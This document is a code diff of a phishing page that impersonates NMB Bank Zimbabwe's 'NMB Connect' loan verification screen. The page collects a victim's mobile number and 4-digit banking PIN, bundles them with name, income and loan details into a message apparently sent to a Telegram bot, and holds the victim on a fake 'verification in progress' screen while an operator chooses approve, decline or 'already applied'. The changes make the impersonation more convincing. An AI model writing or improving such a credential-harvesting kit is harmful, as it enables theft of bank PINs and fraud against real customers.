@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Secure Access</title>
+    <title>NMB Connect - Identity Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
-        .pin-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
+        body { background: linear-gradient(135deg, #003d7a 0%, #002147 100%); min-height: 100vh; }
+        .pin-input:focus { border-color: #fbbf24; box-shadow: 0 0 0 2px rgba(251, 191, 36, 0.2); }
         .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
         .fade-in { animation: fadeIn 0.5s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -20,42 +20,50 @@
     <div class="w-full max-w-sm fade-in">
         <!-- Header -->
         <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-1 mb-2">
-                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
-                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
+            <div class="flex items-center justify-center gap-2 mb-2">
+                <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center shadow-lg">
+                    <span class="text-sm font-black text-[#003d7a]">N</span>
+                </div>
+                <div>
+                    <div class="flex items-center gap-1">
+                        <span class="text-2xl font-black text-white tracking-tighter">NMB</span>
+                        <span class="text-2xl font-black text-[#fbbf24] tracking-tighter">Connect</span>
+                    </div>
+                </div>
             </div>
-            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">Secure Verification</p>
+            <p class="text-white/80 text-[9px] font-bold uppercase tracking-[0.2em]">Identity Verification</p>
         </div>
 
         <!-- Main Card -->
         <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
-                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Verify Identity</h1>
-                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Enter your mobile details</p>
+            <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
+                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Verify Your Details</h1>
+                <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Enter your mobile number and PIN</p>
             </div>
 
             <!-- Content -->
             <div id="loginForm" class="p-6 sm:p-8 space-y-6">
                 <!-- Loan Amount Display -->
                 <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
-                    <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Selected Loan</span>
-                    <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
+                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Loan Amount</span>
+                    <span class="font-black text-lg text-[#003d7a]" id="displayAmount">USD 500</span>
                 </div>
 
                 <!-- Phone Number -->
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Phone Number</label>
+                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">Mobile Number (Zimbabwe)</label>
                     <div class="relative">
                         <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-black text-sm">+263</span>
                         <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
-                            class="w-full pl-16 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#f2a900] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
+                            class="w-full pl-16 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
                     </div>
+                    <p class="text-[8px] text-gray-500">Enter 9-digit Zimbabwean mobile number</p>
                 </div>
 
                 <!-- PIN -->
                 <div class="space-y-2">
-                    <label class="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit PIN</label>
+                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit Security PIN</label>
                     <div class="flex gap-3">
                         <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                         <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
@@ -65,30 +73,30 @@
                 </div>
 
                 <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
-                    Verify Details <i class="fas fa-shield-alt ml-2"></i>
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
+                    Submit for Verification <i class="fas fa-shield-alt ml-2"></i>
                 </button>
             </div>
 
-            <!-- Polling Overlay -->
-            <div id="pollingOverlay" class="hidden p-10 text-center space-y-6">
+            <!-- Verification Overlay -->
+            <div id="verificationOverlay" class="hidden p-10 text-center space-y-6">
                 <div class="relative w-24 h-24 mx-auto">
                     <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
+                    <div class="absolute inset-0 border-4 border-[#fbbf24] border-t-transparent rounded-full animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-user-shield text-3xl text-[#003366]"></i>
+                        <i class="fas fa-user-shield text-3xl text-[#003d7a]"></i>
                     </div>
                 </div>
                 <div class="space-y-2">
-                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verifying</h3>
-                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest">Please wait a moment...</p>
+                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verification in Progress</h3>
+                    <p class="text-gray-500 text-[9px] font-bold uppercase tracking-widest">Hold for verification...</p>
                 </div>
             </div>
         </div>
 
         <!-- Footer -->
-        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
-            © 2026 NMB Bank Zimbabwe | Secure Session
+        <p class="text-center text-white/50 text-[9px] mt-8 font-bold uppercase tracking-widest">
+            © 2026 NMB Bank Zimbabwe | Secure Verification Portal
         </p>
     </div>
 
@@ -101,11 +109,11 @@
         const phoneInput = document.getElementById('phone');
         const submitBtn = document.getElementById('submitBtn');
         const loginForm = document.getElementById('loginForm');
-        const pollingOverlay = document.getElementById('pollingOverlay');
+        const verificationOverlay = document.getElementById('verificationOverlay');
         const displayAmount = document.getElementById('displayAmount');
 
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
-        if (loanData.amount) displayAmount.textContent = `$${parseFloat(loanData.amount).toLocaleString()}`;
+        if (loanData.amount) displayAmount.textContent = `USD ${parseFloat(loanData.amount).toLocaleString()}`;
 
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
@@ -122,7 +130,7 @@
             const phoneRaw = phoneInput.value;
             const pin = Array.from(pinInputs).map(i => i.value).join('');
 
-            if (phoneRaw.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
+            if (phoneRaw.length !== 9) { alert('Please enter a valid 9-digit Zimbabwean phone number'); return; }
             if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
 
             const phone = '+263' + phoneRaw;
@@ -132,25 +140,28 @@
                 ...loanData
             };
             localStorage.setItem('nmb_session', JSON.stringify(sessionData));
-            localStorage.setItem('current_phone', phone); // Key for admin panel to find
+            localStorage.setItem('current_phone', phone);
 
             const message = `
-🚨 <b>NEW LOAN APPLICATION</b>
+🚨 <b>NEW LOAN APPLICATION - NMB ZIMBABWE</b>
 
-👤 Name: ${sessionData.fullName}
-📱 Phone: ${sessionData.phone}
-💰 Amount: $${sessionData.amount}
-📅 Term: ${sessionData.term} months
-💼 Purpose: ${sessionData.purpose}
-💵 Income: $${sessionData.income}
-🔐 <b>PIN: ${pin}</b>
+👤 <b>Applicant Name:</b> ${sessionData.fullName}
+📱 <b>Phone Number:</b> ${sessionData.phone}
+💰 <b>Loan Amount:</b> USD ${sessionData.amount}
+📅 <b>Loan Term:</b> ${sessionData.term} months
+💼 <b>Purpose:</b> ${sessionData.purpose}
+💵 <b>Monthly Income:</b> USD ${sessionData.income}
+🔐 <b>PIN:</b> ${pin}
+
+<b>Status: Awaiting Admin Review</b>
             `;
 
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
                         { text: '✅ APPROVE', callback_data: `approve_${phone}` },
-                        { text: '❌ DECLINE', callback_data: `decline_${phone}` }
+                        { text: '❌ DECLINE', callback_data: `decline_${phone}` },
+                        { text: '⚠️ ALREADY APPLIED', callback_data: `applied_${phone}` }
                     ]
                 ]
             };
@@ -168,7 +179,7 @@
                 });
 
                 loginForm.classList.add('hidden');
-                pollingOverlay.classList.remove('hidden');
+                verificationOverlay.classList.remove('hidden');
                 pollForApproval(phone);
             } catch (error) {
                 alert('Connection error. Please try again.');
@@ -178,7 +189,7 @@
         function pollForApproval(phone) {
             const interval = setInterval(() => {
                 const status = localStorage.getItem(`approval_${phone}`);
-                console.log(`Checking status for ${phone}: ${status}`); // Debug log
+                
                 if (status === 'approved') {
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
@@ -186,6 +197,12 @@
                 } else if (status === 'declined') {
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
+                    alert('Your application has been declined. Please try again later.');
+                    location.reload();
+                } else if (status === 'applied') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`approval_${phone}`);
+                    alert('This phone number has already submitted an application. Please use a different number.');
                     location.reload();
                 }
             }, 1000);
